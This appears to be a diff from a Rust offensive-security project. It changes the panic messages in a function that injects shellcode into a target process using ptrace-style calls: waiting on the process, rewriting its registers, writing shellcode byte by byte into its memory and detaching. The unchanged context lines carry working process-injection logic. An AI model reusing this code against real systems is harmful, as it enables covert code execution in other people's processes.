@@ -31,10 +31,10 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
     // Wait for the process to change to a stopped state, then dump registers
     let target_pid = Pid::from_raw(target_pid);
     if let Err(error) = waitpid(target_pid, Some(WaitPidFlag::WUNTRACED)) {
-        panic!("Could not wait for target process to change state: {}", error);
+        panic!("Could not wait for target process to change state: {error}");
     }
     let mut registers = match getregs(target_pid) {
-        Err(error) => panic!("Could not get registers for target process: {}", error),
+        Err(error) => panic!("Could not get registers for target process: {error}"),
         Ok(value) => value
     };
 
@@ -42,19 +42,19 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
     registers.rip += 2;
     
     if let Err(error) = setregs(target_pid, registers) {
-        panic!("Unable to reset target process registers: {}", error);
+        panic!("Unable to reset target process registers: {error}");
     }
 
     // Write shellcode to target process one byte at a time
     for byte in shellcode {
         if let Err(error) = unsafe { write(target_pid, point as *mut c_void, *byte as *mut c_void) } {
-            panic!("Unable to write portion of shellcode at {} to target process: {}", byte, error);
+            panic!("Unable to write portion of shellcode at {byte} to target process: {error}");
         }
         point += 1;
     }
 
     // Detach from the process so it can resume execution
     if let Err(error) = detach(target_pid, None) {
-        panic!("Unable to detach from target process: {}", error);
+        panic!("Unable to detach from target process: {error}");
     }
 }
